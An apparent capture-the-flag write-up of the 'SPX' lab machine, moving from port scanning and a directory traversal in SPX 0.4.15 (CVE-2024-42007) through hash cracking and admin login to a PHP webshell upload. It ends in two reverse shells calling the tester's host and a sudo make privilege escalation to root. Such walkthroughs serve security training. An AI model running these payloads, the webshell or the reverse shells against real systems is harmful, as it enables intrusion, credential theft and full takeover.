SPX

Target IP: 192.168.142.108
Challenge Description: N/A.

Reconnaissance


Running a TCP port scan using the command sudo nmap -sS 192.168.142.108 -p- returns the result shown in the image above. There are two TCP ports open on the target machine: SSH and HTTP on their standard ports.


Performing an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.142.108 -p 22,80 against the target machine returns the result shown in the image above. The target machine seems to be running the SSH application OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 on port 22. The web server on port 80 is using Apache httpd 2.4.52. Also from the scan, it identified the web application name Tiny File Manager based on the http-title. And lastly, the target machine seems to be running some form of Linux OS.

Enumeration

Port 80: HTTP

The login webpage shown in the picture above is returned for this web application on port 80. It seems like the target host is using Tiny File Manager application on this port. I checked the source-code of the webpage and identified the potential application version 2.5.3. I performed a web server scan using the command nikto -h http://192.168.142.108 and identified /phpinfo.php. This page gives away a lot of system information, such as the Linux OS version, web document root, etc.


When checking through the phpinfo.php file, I came across the interesting entry shown in the picture above. The web server is using SPX 0.4.15 in the backend. This application is used for PHP profiling. I searched for potential vulnerabilities for this version, and I came across this website. This application is vulnerable to Directory Traversal. The CVE ID of this vulnerability is CVE-2024-42007.


Let's summarise what we know so far. The web application Tiny File Manager is running on port 80 as the default application. Attempting to login using the default credentials, or even bruteforcing using the command hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.142.108 http-post-form "/index.php:fm_usr=admin&fm_pwd=^PASS^&token=1dbc7c78a09dc089174369d8e8e4cb0341ceb77904e8b6d32a170d0715e66304:Login failed. Invalid username or password" returns no result. The web server is also using a PHP profiling tool called SPX 0.4.15 which is vulnerable to Directory Traversal (CVE-2024-42007).

Exploitation

Obtaining the Tiny File Manager Credentials Using spx 0.4.15 via Directory Traversal (CVE-2024-42007)

A PoC has been provided here. To exploit this vulnerability, we must use the SPX_KEY and SPX_UI_URI as shown in the picture above. For example, the PoC to read the 'passwd' file is the following:

GET /?SPX_KEY=dev&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/2

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Connection: close
Cache-Control: max-age=0

I intercepted a request to the main web application (/index.php). Then I inserted the SPX_KEY value of a2a90ca2f9f0ea04d267b16fb8e63800. And the SPX_UI_URI to %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd. This payload URL encodes the / which is why %2f exists. And after sending the request, I received the response shown in the picture above. I am able to successfully read the /etc/passwd file. Now I can attempt to read the credentials of the main application, or even the SSH key of the user profiler on the machine. Time to see what I can grab.


I did some research on the Tiny File Manager application, which can be found here. I notice the hashed credentials are stored directly on the PHP source code. If I can read the main page, I can obtain the hashes and crack them on my machine. Also, according to the phpinfo.php page, the document root is set to /var/www/html. To grab the index.php page, I used the URL encoded payload: %2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2findex.php. And bingo. I got the hashes of two users: admin and user. Now I can store them on my machine and attempt to crack them. I obtained the following hashed credentials:

admin => $2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG
user => $2y$10$x8PS6i0Sji2Pglyz7SLFruYFpAsz9XAYsdiPyfse6QDkB/QsdShxi
admin => $2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG
user => $2y$10$x8PS6i0Sji2Pglyz7SLFruYFpAsz9XAYsdiPyfse6QDkB/QsdShxi


I stored the two hashes in a file called hashes on my machine. And to crack them, I ran the command john hashes --wordlist=/usr/share/wordlists/rockyou.txt. And after some long time, I obtained the password profiler belonging to the user user.


I logged into the Tiny File Manager application using the credentials user:profiler and got a hit, as shown in the picture above. Now I have access to the web application. From previous enumeration, it seems to be correct as the application version is 2.5.3. Time to dig further. I notice I cannot upload files as this user.


After some time, I managed to obtain the credentials belonging to the user admin as shown in the picture above. The user admin is using the password lowprofile. This user should have more privileges compared to the user user. Time to check.


And bingo. I logged into the Tiny File Manager application using the credentials admin:lowprofile and the webpage shown in the picture was returned to me. This user has a lot more privileges such as Upload, Delete, etc. The easiest attack vector I can think of is by using File Upload attack. I can upload a PHP webshell and use it to obtain Remote Code Execution (RCE) on the target machine.

Foothold: PHP Webshell Upload via File Upload Attack

<?php
    echo system($_GET['cmd']);
?>
<?php
    echo system($_GET['cmd']);
?>

On my machine, I created a file called sh3ll.php that contains the simple PHP code as shown in the output above.


Then using the Upload feature as the user admin, I uploaded the simple PHP webshell. In the picture above, it mentions the webshell was uploaded to /var/www/html/. Now I can access it by pressing the Open button, as highlighted in yellow in the picture above.


And bingo. I browsed to the uploaded webshell http://192.168.142.108/sh3ll.php?cmd=id;whoami;ls. I issued the commands id;whoami;ls and obtained the output shown in the picture above. I achieved RCE now. Time to obtain a reverse shell connection. I started a listener on my machine at port 8443.


Using my PHP webshell, I deployed the URL encoded PHP reverse shell: php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.206%22%2C8443%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27. And I instantly obtained a reverse shell connection on my machine at port 8443 as shown in the picture above. Now I have a foothold on the target machine as the user www-data. I notice Python is not installed so I cannot upgrade my shell to a TTY one.

Privilege Escalation

Horizontal Privilege Escalation: User www-data to User profiler via Reusing Password

Earlier, I obtained the password lowprofile and profile. There is one user on the machine: profiler. I used the command su profiler and the password lowprofile and got a hit. I managed to successfully elevate my privileges horizontally on the machine from www-data to profiler.

Vertical Privilege Escalation: User profiler to User root via /usr/bin/make Sudo Misconfiguration via SHELL

After some manual enumeration, I didn't find anything important. Running the command sudo -l -S and the password profiler returns the result shown in the image above. The entry (ALL) /usr/bin/make install -C /home/profiler/php-spx looks interesting. Basically, we can create an executable from the directory /home/profiler/php-spx. The file that would interest me is the make file.


Running cat Makefile returns the result shown in the picture above. Inside this file, there is a variable by the name SHELL that contains the entry /bin/sh. It seems like it is executing the shell command.


I transferred the Makefile using nc to my machine from the target machine. Then on my machine, I created the change as shown in the picture above. The SHELL contains the entry bash /home/profiler/shell. The bash shell is used to call the shell over at /home/profiler/. This is where I can place my malicious code, such as calling a reverse shell connection.


After some trial-and-errors, I finally obtained a root shell. Inside the shell file, I inserted the reverse shell command bash -i >& /dev/tcp/192.168.45.206/80 0>&1. This invokes a reverse shell connection to my machine at port 80. I tried with other port numbers like 21, but I had no luck. I started a listener on my machine at port 21. Afterwards, I ran the command sudo -u root /usr/bin/make install -C /home/profiler/php-spx to execute the shell script that will invoke the reverse shell. And I instantly obtained a root shell as shown in the picture above. Now I have a root shell on the target machine :)
